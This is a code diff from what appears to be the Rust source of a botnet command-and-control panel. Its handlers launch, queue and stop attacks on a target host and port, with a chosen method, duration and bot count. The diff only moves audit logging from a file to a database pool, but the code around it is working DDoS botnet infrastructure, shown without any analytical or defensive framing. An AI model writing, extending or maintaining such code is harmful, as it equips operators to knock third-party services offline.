@@ -114,7 +114,7 @@ pub async fn handle_attack_command(client: &Arc<Client>, state: &Arc<AppState>, 
             // Log attack
             let audit_event = AuditLog::new(client.user.username.clone(), "START_ATTACK".to_string(), "SUCCESS".to_string())
                 .with_target(format!("{}:{} (Method: {}, Duration: {}s, Bots: {})", display_target, port, method_str, duration, bot_count));
-            let _ = log_audit_event(audit_event, &state.audit_file).await;
+            let _ = log_audit_event(audit_event, &state.pool).await;
 
             // Send success message
             client.write(format!("\x1b[38;5;82m[✓] Attack sent to {} bots\n\rID: {}\n\rTarget: {}:{}\n\rMethod: {}\n\rDuration: {}s\n\r", 
@@ -136,7 +136,7 @@ pub async fn handle_attack_command(client: &Arc<Client>, state: &Arc<AppState>, 
                         
                         let audit_event = AuditLog::new(client.user.username.clone(), "QUEUE_ATTACK".to_string(), "SUCCESS".to_string())
                             .with_target(format!("{}:{} (Method: {}, Duration: {}s)", display_target, port, method_str, duration));
-                        let _ = log_audit_event(audit_event, &state.audit_file).await;
+                        let _ = log_audit_event(audit_event, &state.pool).await;
                     }
                     Err(queue_err) => {
                         client.write(format!("\x1b[38;5;196m[X] Failed to start or queue attack: {}\n\r", queue_err).as_bytes()).await?;
@@ -244,7 +244,7 @@ pub async fn handle_stop_command(client: &Arc<Client>, state: &Arc<AppState>, pa
                 
                 let audit_event = AuditLog::new(client.user.username.clone(), "STOP_ATTACK".to_string(), "SUCCESS".to_string())
                     .with_target(attack_id.to_string());
-                let _ = log_audit_event(audit_event, &state.audit_file).await;
+                let _ = log_audit_event(audit_event, &state.pool).await;
             } else {
                 client.write(format!("\x1b[38;5;196m[X] Failed to stop attack {}\n\r", attack_id).as_bytes()).await?;
             }
